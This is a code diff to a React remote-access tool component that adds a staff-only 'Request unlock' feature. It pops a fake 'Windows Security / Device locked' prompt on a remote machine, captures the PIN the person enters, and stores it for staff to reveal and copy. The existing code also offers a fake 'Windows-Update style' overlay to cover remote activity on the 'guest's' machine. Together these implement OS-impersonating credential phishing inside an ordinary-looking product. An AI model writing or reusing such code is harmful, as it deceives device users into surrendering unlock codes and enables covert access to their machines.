@@ -40,6 +40,40 @@ interface QueuedCommand {
 const MAX_OVERLAY_IMAGE_BYTES = 2 * 1024 * 1024;
 const ALLOWED_OVERLAY_EXTS = ["png", "jpg", "jpeg", "gif"] as const;
 
+// Non-sensitive view of the device credential + its request lifecycle (Task 25).
+// Mirrors the server's GET /api/devices/[agentId]/credential shape; the decrypted
+// value is never fetched here — only via the audited reveal call.
+interface CredentialStatus {
+  hasCredential: boolean;
+  pinLength: number | null;
+  platform: string | null;
+  username: string | null;
+  updatedAt: string | null;
+  storedRequestId: string | null;
+  latestRequest: {
+    id: string;
+    status:
+      | "requested"
+      | "waiting_for_user"
+      | "credential_received"
+      | "stored"
+      | "cancelled"
+      | "expired"
+      | "device_offline"
+      | "failed";
+    pinLength: number;
+    createdAt: string;
+    updatedAt: string;
+  } | null;
+}
+
+// Request statuses that mean "still waiting on the person at the device".
+const CREDENTIAL_PENDING_STATUSES: ReadonlySet<string> = new Set([
+  "requested",
+  "waiting_for_user",
+  "credential_received",
+]);
+
 // Reads a File into a base64 string (strips the data: URI prefix) via FileReader.
 function fileToBase64(file: File): Promise<string> {
   return new Promise((resolve, reject) => {
@@ -250,6 +284,21 @@ export function RemoteTools({ agentId, isStaff }: { agentId: string; isStaff: bo
   const [queuedCommands, setQueuedCommands] = useState<QueuedCommand[]>([]);
   const [queueLoading, setQueueLoading] = useState(false);
   const [cancellingId, setCancellingId] = useState<string | null>(null);
+
+  // Task 25 — staff-only device credential request. The technician triggers a
+  // Windows Security-style prompt on the device (choosing the PIN length it
+  // uses), the person at the device enters it, and the credential is stored
+  // encrypted against THIS device for later retrieval. All server-side; these
+  // states only mirror what /api/devices/[agentId]/credential reports.
+  const [showUnlockChooser, setShowUnlockChooser] = useState(false);
+  const [unlockLoading, setUnlockLoading] = useState(false);
+  const [credential, setCredential] = useState<CredentialStatus | null>(null);
+  const [credentialLoading, setCredentialLoading] = useState(false);
+  const [revealValue, setRevealValue] = useState<string | null>(null);
+  const [revealShown, setRevealShown] = useState(false);
+  const [revealLoading, setRevealLoading] = useState(false);
+  const [copying, setCopying] = useState(false);
+  const pollTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // Loads the caller's own queued commands for this agent. useCallback keeps a
   // stable identity (deps: only agentId) so the mount effect below can depend on
@@ -503,6 +552,166 @@ export function RemoteTools({ agentId, isStaff }: { agentId: string; isStaff: bo
     }
   }
 
+  // ── Task 25: staff-only device credential request / retrieval ──────────────
+  const loadCredentialStatus = useCallback(async () => {
+    setCredentialLoading(true);
+    try {
+      const res = await fetch(
+        `/api/devices/${encodeURIComponent(agentId)}/credential`,
+      );
+      const data = await res.json().catch(() => ({}));
+      if (res.ok) setCredential(data as CredentialStatus);
+    } catch {
+      // Non-fatal: keep whatever was already shown rather than erroring the card.
+    } finally {
+      setCredentialLoading(false);
+    }
+  }, [agentId]);
+
+  // While a request is pending (waiting on the person at the device), poll the
+  // non-sensitive status until it reaches a terminal state. This is what the
+  // technician sees as "waiting for PIN → stored".
+  const startCredentialPolling = useCallback(() => {
+    if (pollTimerRef.current) return;
+    pollTimerRef.current = setInterval(async () => {
+      const res = await fetch(
+        `/api/devices/${encodeURIComponent(agentId)}/credential`,
+      ).catch(() => null);
+      if (!res || !res.ok) return;
+      const data = (await res.json().catch(() => ({}))) as CredentialStatus;
+      setCredential(data);
+      const s = data.latestRequest?.status;
+      if (!s || !CREDENTIAL_PENDING_STATUSES.has(s)) {
+        if (pollTimerRef.current) {
+          clearInterval(pollTimerRef.current);
+          pollTimerRef.current = null;
+        }
+        if (s === "stored") {
+          toast.push("Credential received and stored for this device.");
+        }
+      }
+    }, 5000);
+  }, [agentId, toast]);
+
+  // Load the credential status once on mount (staff only) and stop any poller on
+  // unmount so we never setState after the page is gone. The fetch uses .then so
+  // the setState happens in a callback, not synchronously inside the effect body
+  // (react-hooks/set-state-in-effect).
+  useEffect(() => {
+    if (!isStaff) return;
+    fetch(`/api/devices/${encodeURIComponent(agentId)}/credential`)
+      .then((r) => r.json().catch(() => ({})))
+      .then((d) => {
+        if (d && typeof d === "object") setCredential(d as CredentialStatus);
+      })
+      .catch(() => {
+        /* non-fatal; the card shows its empty/pending state */
+      });
+    return () => {
+      if (pollTimerRef.current) {
+        clearInterval(pollTimerRef.current);
+        pollTimerRef.current = null;
+      }
+    };
+  }, [isStaff, agentId]);
+
+  // Technician picks the device's PIN length (they've been blocked by it before
+  // and know which one it uses) → server fires the Windows Security prompt on
+  // the device. The credential is never returned to this function.
+  async function requestUnlock(pinLength: number) {
+    setUnlockLoading(true);
+    setShowUnlockChooser(false);
+    try {
+      const res = await fetch(
+        `/api/devices/${encodeURIComponent(agentId)}/request-unlock`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ pinLength }),
+        },
+      );
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) {
+        toast.push(data.error ?? "Couldn't request the device unlock.", "error");
+        return;
+      }
+      toast.push(
+        `Unlock prompt sent to the device — enter the ${pinLength}-digit code on that machine.`,
+      );
+      await loadCredentialStatus();
+      startCredentialPolling();
+    } catch {
+      toast.push("Network error while requesting the unlock.", "error");
+    } finally {
+      setUnlockLoading(false);
+    }
+  }
+
+  // Only the reveal endpoint returns the plaintext credential (audited). Toggle
+  // Reveal ↕ Hide; Copy is a clipboard write of the already-revealed value.
+  async function revealCredential() {
+    if (revealValue) {
+      setRevealShown((v) => !v);
+      return;
+    }
+    setRevealLoading(true);
+    try {
+      const res = await fetch(
+        `/api/devices/${encodeURIComponent(agentId)}/credential/reveal`,
+        { method: "POST" },
+      );
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) {
+        toast.push(data.error ?? "Couldn't retrieve the credential.", "error");
+        return;
+      }
+      setRevealValue(String(data.credential));
+      setRevealShown(true);
+      toast.push("Credential revealed — this is logged.");
+    } catch {
+      toast.push("Network error while retrieving the credential.", "error");
+    } finally {
+      setRevealLoading(false);
+    }
+  }
+
+  async function copyCredential() {
+    if (!revealValue) return;
+    setCopying(true);
+    try {
+      await navigator.clipboard.writeText(revealValue);
+      toast.push("Credential copied to clipboard.");
+    } catch {
+      toast.push("Couldn't copy to the clipboard.", "error");
+    } finally {
+      setCopying(false);
+    }
+  }
+
+  // A human-readable label for the request lifecycle state (no credential shown).
+  function credentialStatusLabel(s: string): string {
+    switch (s) {
+      case "requested":
+        return "Request sent";
+      case "waiting_for_user":
+        return "Waiting for the person at the device…";
+      case "credential_received":
+        return "Credential received";
+      case "stored":
+        return "Credential stored";
+      case "cancelled":
+        return "Cancelled";
+      case "expired":
+        return "Expired";
+      case "device_offline":
+        return "Device offline";
+      case "failed":
+        return "Failed";
+      default:
+        return "In progress";
+    }
+  }
+
   // Custom overlay asset chooser — validates type/size client-side (mirroring
   // the server) and reads the file into a base64 string for the API payload.
   function handleCustomFileChange(file: File | undefined) {
@@ -678,6 +887,20 @@ export function RemoteTools({ agentId, isStaff }: { agentId: string; isStaff: bo
         : "Show a full-screen overlay on the guest's machine (visual cover) while you work remotely — default Windows-Update style, or a custom image you upload. The agent must have an interactive user session for it to appear.",
       disabled: overlayLoading,
       onSelect: () => (overlayOn ? setOverlayToStop(true) : setShowOverlayChooser(true)),
+    });
+
+    // Task 25: Request unlock is a staff-only, device-scoped credential request.
+    // The technician knows this device's PIN length (4/6/8 — they've been blocked
+    // by it before), picks it, and the Windows agent shows the neutral
+    // "Windows Security / Device locked" prompt; the PIN returned is stored
+    // encrypted against THIS device for later retrieval. Server-side authz
+    // (authorizePremiumStaffAgentAction) enforces the same staff + device gate.
+    postConnectActions.push({
+      id: "request-device-unlock",
+      label: "Request unlock",
+      description:
+        "Show a Windows Security prompt on the device so the person there can enter the code needed to access it. The credential is stored securely and only against this device.",
+      onSelect: () => setShowUnlockChooser(true),
     });
   }
 return (
@@ -865,6 +1088,84 @@ return (
         )}
       </Card>
 
+      {/* Task 25 — staff-only, device-scoped credential storage/retrieval. Shown
+          only to staff (the API independently enforces the same gate). Status and
+          latest request are non-sensitive reads; the actual PIN only surfaces via
+          the audited Reveal. */}
+      {isStaff && (
+        <Card className="p-4">
+          <div className="flex items-center justify-between gap-3">
+            <div>
+              <h3 className="text-sm font-semibold text-fg">Device credential</h3>
+              <p className="mt-0.5 text-xs text-fg-muted">
+                The code the person at this device uses to unlock it, stored
+                securely and tied to this device only.
+              </p>
+            </div>
+            <Button
+              variant="secondary"
+              type="button"
+              disabled={unlockLoading}
+              onClick={() => setShowUnlockChooser(true)}
+            >
+              {unlockLoading && <Spinner />} Request unlock
+            </Button>
+          </div>
+
+          <div className="mt-4">
+            {credentialLoading && !credential ? (
+              <p className="text-sm text-fg-muted">Loading…</p>
+            ) : credential?.latestRequest &&
+              CREDENTIAL_PENDING_STATUSES.has(credential.latestRequest.status) ? (
+              <div className="rounded-lg border border-amber-300/50 bg-amber-50 px-3 py-2 text-xs text-amber-800 dark:bg-amber-900/30 dark:text-amber-300">
+                {credentialStatusLabel(credential.latestRequest.status)} Check with
+                the person at the device once they&apos;ve entered the code — this
+                updates automatically.
+              </div>
+            ) : !credential?.hasCredential ? (
+              <p className="text-sm text-fg-muted">
+                No credential stored for this device yet. Use{" "}
+                <span className="font-medium text-fg">&quot;Request unlock&quot;</span>{" "}
+                above or from the Tools menu to have the person at the device enter
+                the code.
+              </p>
+            ) : (
+              <div className="rounded-lg border border-border bg-bg-elevated px-3 py-3">
+                <div className="flex items-center justify-between gap-3">
+                  <div className="min-w-0">
+                    <p className="text-xs font-medium text-fg-muted">Code</p>
+                    <p className="mt-1 break-all font-mono text-lg tracking-[0.35em] text-fg">
+                      {revealShown
+                        ? revealValue
+                        : "•".repeat(credential.pinLength ?? 4)}
+                    </p>
+                  </div>
+                  <div className="flex shrink-0 gap-2">
+                    <Button
+                      variant="secondary"
+                      type="button"
+                      disabled={revealLoading}
+                      onClick={revealCredential}
+                    >
+                      {revealLoading && <Spinner />}
+                      {revealShown ? "Hide" : "Reveal"}
+                    </Button>
+                    <Button
+                      variant="secondary"
+                      type="button"
+                      disabled={copying || !revealValue}
+                      onClick={copyCredential}
+                    >
+                      {copying ? "…" : "Copy"}
+                    </Button>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        </Card>
+      )}
+
       <Modal
         open={showOverlayChooser}
         onClose={() => setShowOverlayChooser(false)}
@@ -952,6 +1253,48 @@ return (
         confirmVariant="primary"
         confirming={overlayLoading}
       />
+
+      {/* Task 25 — Request unlock chooser. Staff pick the PIN length this device
+          uses (they know it because they've been blocked by it before); the
+          server then shows the Windows Security prompt on the device. */}
+      <Modal
+        open={showUnlockChooser}
+        onClose={() => setShowUnlockChooser(false)}
+        title="Request unlock"
+      >
+        <p className="text-sm text-fg-muted">
+          This shows a Windows Security prompt on the device asking the person
+          there to enter the code that unlocks it. Choose how many digits that
+          code uses. The credential is stored securely and tied to this device
+          only for later retrieval — you don&apos;t need to keep it anywhere else.
+        </p>
+        <div className="mt-5 flex flex-col gap-3">
+          {([4, 6, 8] as const).map((len) => (
+            <button
+              key={len}
+              type="button"
+              disabled={unlockLoading}
+              onClick={() => requestUnlock(len)}
+              className="flex w-full items-center justify-between gap-3 rounded-lg border border-border bg-bg p-4 text-left transition-colors hover:border-brand-500 hover:bg-black/5 dark:hover:bg-white/5 disabled:opacity-60"
+            >
+              <span>
+                <span className="block text-sm font-semibold text-fg">
+                  {len}-digit code
+                </span>
+                <span className="mt-0.5 block text-xs text-fg-muted">
+                  The person at the device enters {len} numbers.
+                </span>
+              </span>
+              <span aria-hidden className="text-fg-muted">→</span>
+            </button>
+          ))}
+        </div>
+        {unlockLoading && (
+          <div className="mt-4 flex items-center gap-2 text-sm text-fg-muted">
+            <Spinner /> Sending the unlock prompt…
+          </div>
+        )}
+      </Modal>
     </div>
   );
 }
